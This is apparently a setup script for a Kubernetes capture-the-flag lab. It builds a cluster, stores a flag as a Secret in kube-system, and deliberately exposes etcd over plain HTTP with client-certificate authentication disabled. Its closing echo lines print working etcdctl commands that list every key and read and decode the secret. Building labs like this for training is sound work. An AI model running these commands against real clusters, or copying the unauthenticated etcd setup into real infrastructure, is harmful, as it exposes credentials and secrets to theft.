#!/bin/bash
set -euo pipefail
K8S_ID="k8s-08"
CLUSTER_NAME="cve-k8s-08-etcd"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

k8s_init
k8s_create_cluster
k8s_wait_ready

# Store the flag as a REAL Kubernetes Secret in kube-system, so it is persisted
# in the cluster's actual etcd at /registry/secrets/kube-system/etcd-flag
echo "[*] Creating flag Secret in kube-system (persisted in the real cluster etcd)..."
k8s_create_k8s_secret "etcd-flag" "kube-system"

k8s_info
echo "[+] Real cluster etcd exposed at localhost:11379 (HTTP, client-cert-auth disabled)"
echo "[+] Attack: ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get / --prefix --keys-only"
echo "[+] Read flag: ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag --print-value-only | python3 -c \"import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['flag']).decode())\""
